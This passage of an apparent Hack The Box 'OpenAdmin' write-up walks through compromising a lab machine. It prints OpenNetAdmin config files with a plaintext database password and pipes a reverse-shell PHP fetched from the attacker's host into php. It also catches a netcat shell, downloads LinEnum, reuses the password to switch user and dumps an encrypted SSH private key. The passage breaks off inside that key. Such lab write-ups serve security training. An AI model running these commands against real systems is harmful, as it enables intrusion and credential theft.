bash</span></span><br><span class="line"></span><br><span class="line">$ cat /opt/ona/www/config/config.inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////   WARNING   /////////////////////////////</span></span><br><span class="line"><span class="comment">//           This is the site configuration file.              //</span></span><br><span class="line"><span class="comment">//                                                             //</span></span><br><span class="line"><span class="comment">//      It is not intended that this file be edited.  Any      //</span></span><br><span class="line"><span class="comment">//      user configurations should be in the local config or   //</span></span><br><span class="line"><span class="comment">//      in the database table sys_config                       //</span></span><br><span class="line"><span class="comment">//                                                             //</span></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Used in PHP for include files and such</span></span><br><span class="line"><span class="comment">// Prefix.. each .php file should have already set $base and $include</span></span><br><span class="line"><span class="comment">// if it is written correctly.  We assume that is the case.</span></span><br><span class="line">$base;</span><br><span class="line">$include;</span><br><span class="line"></span><br><span class="line">$onabase = dirname($base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$baseURL = preg_replace('+' . dirname($_SERVER['DOCUMENT_ROOT']) . '+', '', $base);</span></span><br><span class="line"><span class="comment">//$baseURL = preg_replace('+/$+', '', $baseURL);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Used in URL links</span></span><br><span class="line">$baseURL=dirname($_SERVER[<span class="string">'SCRIPT_NAME'</span>]); $baseURL = rtrim($baseURL, <span class="string">'/'</span>);</span><br><span class="line">$images = <span class="string">"&#123;$baseURL&#125;/images"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// help URL location</span></span><br><span class="line">$_ENV[<span class="string">'help_url'</span>] = <span class="string">"http://opennetadmin.com/docs/"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Get any query info</span></span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Many of these settings serve as defaults.  They can be overridden by the settings in</span></span><br><span class="line"><span class="comment">// the table "sys_config"</span></span><br><span class="line">$conf = <span class="keyword">array</span> (</span><br><span class="line">    <span class="comment">/* General Setup */</span></span><br><span class="line">    <span class="comment">// Database Context</span></span><br><span class="line">    <span class="comment">// For possible values see the $ona_contexts() array  in the database_settings.inc.php file</span></span><br><span class="line">    <span class="string">"default_context"</span>        =&gt; <span class="string">'DEFAULT'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Used in header.php */</span></span><br><span class="line">    <span class="string">"title"</span>                  =&gt; <span class="string">'OpenNetAdmin :: '</span>,</span><br><span class="line">    <span class="string">"meta_description"</span>       =&gt; <span class="string">''</span>,</span><br><span class="line">    <span class="string">"meta_keywords"</span>          =&gt; <span class="string">''</span>,</span><br><span class="line">    <span class="string">"html_headers"</span>           =&gt; <span class="string">''</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Include Files: HTML */</span></span><br><span class="line">    <span class="string">"html_style_sheet"</span>       =&gt; <span class="string">"$include/html_style_sheet.inc.php"</span>,</span><br><span class="line">    <span class="string">"html_desktop"</span>           =&gt; <span class="string">"$include/html_desktop.inc.php"</span>,</span><br><span class="line">    <span class="string">"loading_icon"</span>           =&gt; <span class="string">"&lt;br&gt;&lt;center&gt;&lt;img src=\"&#123;$images&#125;/loading.gif\"&gt;&lt;/center&gt;&lt;br&gt;"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Include Files: Functions */</span></span><br><span class="line">    <span class="string">"inc_functions"</span>          =&gt; <span class="string">"$include/functions_general.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_functions_gui"</span>      =&gt; <span class="string">"$include/functions_gui.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_functions_db"</span>       =&gt; <span class="string">"$include/functions_db.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_functions_auth"</span>     =&gt; <span class="string">"$include/functions_auth.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_db_sessions"</span>        =&gt; <span class="string">"$include/adodb_sessions.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_adodb"</span>              =&gt; <span class="string">"$include/adodb/adodb.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_adodb_xml"</span>          =&gt; <span class="string">"$include/adodb/adodb-xmlschema03.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_xajax_stuff"</span>        =&gt; <span class="string">"$include/xajax_setup.inc.php"</span>,</span><br><span class="line">    <span class="string">"inc_diff"</span>               =&gt; <span class="string">"$include/DifferenceEngine.php"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Settings for dcm.pl */</span></span><br><span class="line">    <span class="string">"dcm_module_dir"</span>         =&gt; <span class="string">"$base/modules"</span>,</span><br><span class="line">    <span class="string">"plugin_dir"</span>             =&gt; <span class="string">"$base/local/plugins"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Defaults for some user definable options normally in sys_config table */</span></span><br><span class="line">    <span class="string">"debug"</span>                  =&gt; <span class="string">"2"</span>,</span><br><span class="line">    <span class="string">"syslog"</span>                 =&gt; <span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"stdout"</span>                 =&gt; <span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"log_to_db"</span>              =&gt; <span class="string">"0"</span>,</span><br><span class="line">    <span class="string">"logfile"</span>                =&gt; <span class="string">"/var/log/ona.log"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The output charset to be used in htmlentities() and htmlspecialchars() filtering */</span></span><br><span class="line">    <span class="string">"charset"</span>                =&gt; <span class="string">"utf8"</span>,</span><br><span class="line">    <span class="string">"php_charset"</span>            =&gt; <span class="string">"UTF-8"</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// enable the setting of the database character set using the "set name 'charset'" SQL command</span></span><br><span class="line">    <span class="comment">// This should work for mysql and postgres but may not work for Oracle.</span></span><br><span class="line">    <span class="comment">// it will be set to the value in 'charset' above.</span></span><br><span class="line">    <span class="string">"set_db_charset"</span>         =&gt; <span class="keyword">TRUE</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Read in the version file to our conf variable</span></span><br><span class="line"><span class="comment">// It must have a v&lt;majornum&gt;.&lt;minornum&gt;, no number padding, to match the check version code.</span></span><br><span class="line"><span class="keyword">if</span> (file_exists($base.<span class="string">'/../VERSION'</span>)) &#123; $conf[<span class="string">'version'</span>] = trim(file_get_contents($base.<span class="string">'/../VERSION'</span>)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The $self array is used to store globally available temporary data.</span></span><br><span class="line"><span class="comment">// Think of it as a cache or an easy way to pass data around ;)</span></span><br><span class="line"><span class="comment">// I've tried to define the entries that are commonly used:</span></span><br><span class="line">$self = <span class="keyword">array</span> (</span><br><span class="line">    <span class="comment">// Error messages will often get stored in here</span></span><br><span class="line">    <span class="string">"error"</span>                  =&gt; <span class="string">""</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// All sorts of things get cached in here to speed things up</span></span><br><span class="line">    <span class="string">"cache"</span>                  =&gt; <span class="keyword">array</span>(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get's automatically set to 1 if we're using HTTPS/SSL</span></span><br><span class="line">    <span class="string">"secure"</span>                 =&gt; <span class="number">0</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">// If the server port is 443 then this is a secure page</span></span><br><span class="line"><span class="comment">// This is basically used to put a padlock icon on secure pages.</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="number">443</span>) &#123; $self[<span class="string">'secure'</span>] = <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//                            STYLE SHEET STUFF                              //</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Colors</span></span><br><span class="line">$color[<span class="string">'bg'</span>]                   = <span class="string">'#FFFFFF'</span>;</span><br><span class="line">$color[<span class="string">'content_bg'</span>]           = <span class="string">'#FFFFFF'</span>;</span><br><span class="line">$color[<span class="string">'bar_bg'</span>]               = <span class="string">'#D3DBFF'</span>;</span><br><span class="line">$color[<span class="string">'border'</span>]               = <span class="string">'#555555'</span>; <span class="comment">//#1A1A1A</span></span><br><span class="line">$color[<span class="string">'form_bg'</span>]              = <span class="string">'#FFEFB6'</span>;</span><br><span class="line"></span><br><span class="line">$color[<span class="string">'font_default'</span>]         = <span class="string">'#000000'</span>;</span><br><span class="line">$color[<span class="string">'font_title'</span>]           = <span class="string">'#4E4E4E'</span>;</span><br><span class="line">$color[<span class="string">'font_subtitle'</span>]        = <span class="string">'#5A5A5A'</span>;</span><br><span class="line">$color[<span class="string">'font_error'</span>]           = <span class="string">'#E35D5D'</span>;</span><br><span class="line"></span><br><span class="line">$color[<span class="string">'link'</span>]                 = <span class="string">'#6B7DD1'</span>;</span><br><span class="line">$color[<span class="string">'vlink'</span>]                = <span class="string">'#6B7DD1'</span>;</span><br><span class="line">$color[<span class="string">'alink'</span>]                = <span class="string">'#6B7DD1'</span>;</span><br><span class="line">$color[<span class="string">'link_nav'</span>]             = <span class="string">'#0048FF'</span>;  <span class="comment">// was '#7E8CD7';</span></span><br><span class="line">$color[<span class="string">'link_act'</span>]             = <span class="string">'#FF8000'</span>;  <span class="comment">// was '#EB8F1F';</span></span><br><span class="line">$color[<span class="string">'link_domain'</span>]          = <span class="string">'green'</span>;    <span class="comment">// was '#5BA65B';</span></span><br><span class="line"></span><br><span class="line">$color[<span class="string">'button_normal'</span>]        = <span class="string">'#FFFFFF'</span>;</span><br><span class="line">$color[<span class="string">'button_hover'</span>]         = <span class="string">'#E0E0E0'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define some colors for the subnet map:</span></span><br><span class="line">$color[<span class="string">'bgcolor_map_host'</span>]     = <span class="string">'#BFD2FF'</span>;</span><br><span class="line">$color[<span class="string">'bgcolor_map_subnet'</span>]   = <span class="string">'#CCBFFF'</span>;</span><br><span class="line">$color[<span class="string">'bgcolor_map_selected'</span>] = <span class="string">'#FBFFB6'</span>;</span><br><span class="line">$color[<span class="string">'bgcolor_map_empty'</span>]    = <span class="string">'#FFFFFF'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Much of this configuration is required here since</span></span><br><span class="line"><span class="comment">// a lot of it's used in xajax calls before a web page is created.</span></span><br><span class="line">$color[<span class="string">'menu_bar_bg'</span>]          = <span class="string">'#F3F1FF'</span>;</span><br><span class="line">$color[<span class="string">'menu_header_bg'</span>]       = <span class="string">'#FFFFFF'</span>;</span><br><span class="line">$color[<span class="string">'menu_item_bg'</span>]         = <span class="string">'#F3F1FF'</span>;</span><br><span class="line">$color[<span class="string">'menu_header_text'</span>]     = <span class="string">'#436976'</span>;</span><br><span class="line">$color[<span class="string">'menu_item_text'</span>]       = <span class="string">'#436976'</span>;</span><br><span class="line">$color[<span class="string">'menu_item_selected_bg'</span>]= <span class="string">'#B1C6E3'</span>;</span><br><span class="line">$color[<span class="string">'menu_header_bg'</span>]       = <span class="string">'#B1C6E3'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Style variables (used in PHP in various places)</span></span><br><span class="line">$style[<span class="string">'font-family'</span>] = <span class="string">"Arial, Sans-Serif"</span>;</span><br><span class="line">$style[<span class="string">'borderT'</span>] = <span class="string">"border-top: 1px solid &#123;$color['border']&#125;;"</span>;</span><br><span class="line">$style[<span class="string">'borderB'</span>] = <span class="string">"border-bottom: 1px solid &#123;$color['border']&#125;;"</span>;</span><br><span class="line">$style[<span class="string">'borderL'</span>] = <span class="string">"border-left: 1px solid &#123;$color['border']&#125;;"</span>;</span><br><span class="line">$style[<span class="string">'borderR'</span>] = <span class="string">"border-right: 1px solid &#123;$color['border']&#125;;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the localized configuration settings</span></span><br><span class="line"><span class="comment">// MP: this may not be needed now that "user" configs are in the database</span></span><br><span class="line">@<span class="keyword">include</span>(<span class="string">"&#123;$base&#125;/local/config/config.inc.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the basic system functions</span></span><br><span class="line"><span class="comment">// any $conf settings used in this "require" should not be user adjusted in the sys_config table</span></span><br><span class="line"><span class="keyword">require_once</span>($conf[<span class="string">'inc_functions'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the basic database functions</span></span><br><span class="line"><span class="keyword">require_once</span>($conf[<span class="string">'inc_functions_db'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the localized Database settings</span></span><br><span class="line">$dbconffile = <span class="string">"&#123;$base&#125;/local/config/database_settings.inc.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (file_exists($dbconffile)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(exec(<span class="string">"php -l $dbconffile"</span>), <span class="number">0</span>, <span class="number">28</span>) == <span class="string">"No syntax errors detected in"</span>) &#123;</span><br><span class="line">        @<span class="keyword">include</span>($dbconffile);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Syntax error in your DB config file: &#123;$dbconffile&#125;&lt;br&gt;Please check that it contains a valid PHP formatted array, or check that you have the php cli tools installed.&lt;br&gt;You can perform this check maually using the command 'php -l &#123;$dbconffile&#125;'."</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span>($base.<span class="string">'/../install/install.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if the run_install file exists.</span></span><br><span class="line"><span class="comment">// If it does, run the install process.</span></span><br><span class="line"><span class="keyword">if</span> (file_exists($base.<span class="string">'/local/config/run_install'</span>) <span class="keyword">or</span> @$runinstaller <span class="keyword">or</span> @$install_submit == <span class="string">'Y'</span>) &#123;</span><br><span class="line">    <span class="comment">// Process the install script</span></span><br><span class="line">    <span class="keyword">require_once</span>($base.<span class="string">'/../install/install.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set multibyte encoding to UTF-8</span></span><br><span class="line"><span class="keyword">if</span> (@function_exists(<span class="string">'mb_internal_encoding'</span>)) &#123;</span><br><span class="line">    mb_internal_encoding(<span class="string">"UTF-8"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printmsg(<span class="string">"INFO =&gt; Missing 'mb_internal_encoding' function. Please install PHP 'mbstring' functions for proper UTF-8 encoding."</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we dont have a ona_context set in the cookie, lets set a cookie with the default context</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'ona_context_name'</span>])) &#123; $_COOKIE[<span class="string">'ona_context_name'</span>] = $conf[<span class="string">'default_context'</span>]; setcookie(<span class="string">"ona_context_name"</span>, $conf[<span class="string">'default_context'</span>]); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (Re)Connect to the DB now.</span></span><br><span class="line"><span class="keyword">global</span> $onadb;</span><br><span class="line">$onadb = db_pconnect(<span class="string">''</span>, $_COOKIE[<span class="string">'ona_context_name'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the actual user config from the database table sys_config</span></span><br><span class="line"><span class="comment">// These will override any of the defaults set above</span></span><br><span class="line"><span class="keyword">list</span>($status, $rows, $records) = db_get_records($onadb, <span class="string">'sys_config'</span>, <span class="string">'name like "%"'</span>, <span class="string">'name'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($records <span class="keyword">as</span> $record) &#123;</span><br><span class="line">    printmsg(<span class="string">"INFO =&gt; Loaded config item from database: &#123;$record['name']&#125;=''&#123;$record['value']&#125;''"</span>,<span class="number">5</span>);</span><br><span class="line">    $conf[$record[<span class="string">'name'</span>]] = $record[<span class="string">'value'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include functions that replace the default session handler with one that uses MySQL as a backend</span></span><br><span class="line"><span class="keyword">require_once</span>($conf[<span class="string">'inc_db_sessions'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the GUI functions</span></span><br><span class="line"><span class="keyword">require_once</span>($conf[<span class="string">'inc_functions_gui'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Include the AUTH functions</span></span><br><span class="line"><span class="keyword">require_once</span>($conf[<span class="string">'inc_functions_auth'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Start the session handler (this calls a function defined in functions_general)</span></span><br><span class="line">startSession();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set session inactivity threshold</span></span><br><span class="line">ini_set(<span class="string">"session.gc_maxlifetime"</span>, $conf[<span class="string">'cookie_life'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// if search_results_per_page is in the session, set the $conf variable to it.  this fixes the /rows command</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'search_results_per_page'</span>])) $conf[<span class="string">'search_results_per_page'</span>] = $_SESSION[<span class="string">'search_results_per_page'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set up our page to https if requested for our URL links</span></span><br><span class="line"><span class="keyword">if</span> (@($conf[<span class="string">'force_https'</span>] == <span class="number">1</span>) <span class="keyword">or</span> ($_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="number">443</span>)) &#123;</span><br><span class="line">    $https  = <span class="string">"https://&#123;$_SERVER['SERVER_NAME']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SERVER[<span class="string">'SERVER_PORT'</span>] != <span class="number">80</span>) &#123;</span><br><span class="line">      $https  = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;:&#123;$_SERVER['SERVER_PORT']&#125;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $https  = <span class="string">"http://&#123;$_SERVER['SERVER_NAME']&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DON'T put whitespace at the beginning or end of included files!!!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>when you examine the configuration is database is on <code>/local/config/database_settings.inc.php</code> base on the line :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">// Include the localized Database settings</span><br><span class="line"><span class="variable">$dbconffile</span> = <span class="string">"&#123;<span class="variable">$base</span>&#125;/local/config/database_settings.inc.php"</span>;</span><br></pre></td></tr></table></figure><p>trying to look at that and I got a password <code>n1nj4W4rri0R!</code> for user :</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">cat /opt/ona/www/local/config/database_settings.inc.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ona_contexts=<span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'DEFAULT'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'databases'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="number">0</span> =&gt; </span><br><span class="line">      <span class="keyword">array</span> (</span><br><span class="line">        <span class="string">'db_type'</span> =&gt; <span class="string">'mysqli'</span>,</span><br><span class="line">        <span class="string">'db_host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">        <span class="string">'db_login'</span> =&gt; <span class="string">'ona_sys'</span>,</span><br><span class="line">        <span class="string">'db_passwd'</span> =&gt; <span class="string">'n1nj4W4rri0R!'</span>,</span><br><span class="line">        <span class="string">'db_database'</span> =&gt; <span class="string">'ona_default'</span>,</span><br><span class="line">        <span class="string">'db_debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'description'</span> =&gt; <span class="string">'Default data context'</span>,</span><br><span class="line">    <span class="string">'context_color'</span> =&gt; <span class="string">'#D3DBFF'</span>,</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>the problem is‚Äô I don‚Äôt who has the user which I can use on the password I found, so the only thing to do is to get a proper shell then send <code>LinEnum</code> to enumerate all the posibily things to do in privilege escalation.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Get-a-proper-shell"><a href="#Get-a-proper-shell" class="headerlink" title="Get a proper shell"></a>Get a proper shell</h3><p>So I set up a <code>netcat</code> listener on my Kali, then curl the <code>php</code> reverse shell on OpenAdmin machine :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 </span><br><span class="line">‚ùØ bash exploit.sh http://10.10.10.171/ona/</span><br><span class="line">$ <span class="built_in">cd</span> /dev/shm</span><br><span class="line">$ curl http://10.10.14.118/shell.php | php</span><br></pre></td></tr></table></figure><p>Finally I have now a proper shell :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/OpenAdmin via üêò v7.3.15 </span><br><span class="line">‚ùØ nc -nlvp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.14.118] from (UNKNOWN) [10.10.10.171] 55662</span><br><span class="line">Linux openadmin 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 20:42:27 up  3:11,  7 users,  load average: 2.88, 0.98, 0.36</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">joanna   pts/0    10.10.15.26      17:37    2:36m  0.10s  0.01s sshd: joanna [priv] </span><br><span class="line">jimmy    pts/4    10.10.15.24      18:49    1:52m  0.04s  0.04s -bash</span><br><span class="line">jimmy    pts/5    10.10.14.253     20:31    3:23   0.08s  0.08s -bash</span><br><span class="line">joanna   pts/7    127.0.0.1        18:58    1:30m  0.04s  0.04s -bash</span><br><span class="line">joanna   pts/9    127.0.0.1        19:17   34:43   0.06s  0.01s sshd: joanna [priv] </span><br><span class="line">jimmy    pts/10   10.10.14.116     20:38    4:13   0.04s  0.04s -bash</span><br><span class="line">jimmy    pts/11   10.10.15.3       20:41   10.00s  0.05s  0.05s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ export TERM=xterm</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure><p>now it‚Äôs time to send <strong><code>LinEnum</code></strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> /tmp</span><br><span class="line">$ ls</span><br><span class="line">$ <span class="built_in">pwd</span> </span><br><span class="line">/tmp</span><br><span class="line">$ curl -o linenum.sh http://10.10.14.118/LinEnum.sh</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 46631  100 46631    0     0  13232      0  0:00:03  0:00:03 --:--:-- 13228</span><br><span class="line">$ ls</span><br><span class="line">linenum.sh</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>running this finally i get now the user it is <code>jimmy</code> and <code>joanna</code> :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ bash linenum.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] Users that have previously logged onto the system:</span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root             tty1                      Sat Jan  4 21:23:05 +0000 2020</span><br><span class="line">jimmy            pts/11   10.10.15.3       Sun May  3 20:41:37 +0000 2020</span><br><span class="line">joanna           pts/10   10.10.15.142     Sun May  3 19:20:25 +0000 2020</span><br></pre></td></tr></table></figure><p>i switch first to user <code>jimmy</code> and tried the password I found, and it‚Äôs work !</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">$ python3 -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br><span class="line">www-data@openadmin:/tmp$ su jimmy</span><br><span class="line">su jimmy</span><br><span class="line">Password: n1nj4W4rri0R!</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/tmp$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">jimmy@openadmin:/home$ ls</span><br><span class="line">ls</span><br><span class="line">jimmy  joanna</span><br><span class="line">jimmy@openadmin:/home$ <span class="built_in">cd</span> jimmy</span><br><span class="line"><span class="built_in">cd</span> jimmy</span><br><span class="line">jimmy@openadmin:~$</span><br></pre></td></tr></table></figure><p>But still <code>user.txt</code> isn‚Äôt available for this user so I need to escalate <code>joanna</code>, I go back on the <code>/var/www/</code> directory and there was a internal site which has help me a lot :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:~$ <span class="built_in">cd</span> /var/www</span><br><span class="line"><span class="built_in">cd</span> /var/www</span><br><span class="line">jimmy@openadmin:/var/www$ ls</span><br><span class="line">ls</span><br><span class="line">html  internal  ona</span><br><span class="line">jimmy@openadmin:/var/www$ <span class="built_in">cd</span> internal</span><br><span class="line"><span class="built_in">cd</span> internal</span><br><span class="line">jimmy@openadmin:/var/www/internal$ ls</span><br><span class="line">ls</span><br><span class="line">a.php  index.php  logout.php  main.php</span><br><span class="line">jimmy@openadmin:/var/www/internal$</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h3><p>base <code>main.php</code> file there‚Äôs a <code>ssh key</code> home directory of <code>joanna</code>. It is prompts the <code>jimmy</code> user to output the rsa key of another user joanna through login authentication. Now we need to know which port this service is running on :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ netstat -tulpn</span><br><span class="line">netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   </span><br><span class="line">jimmy@openadmin:/var/www/internal$</span><br></pre></td></tr></table></figure><p>So there‚Äôs a port <code>52846</code> running on a localhost i <code>curl</code> the site if i can get the <code>RSA Keys</code> and there is :</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ curl http://localhost:52846/main.php</span><br><span class="line">curl http://localhost:52846/main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span 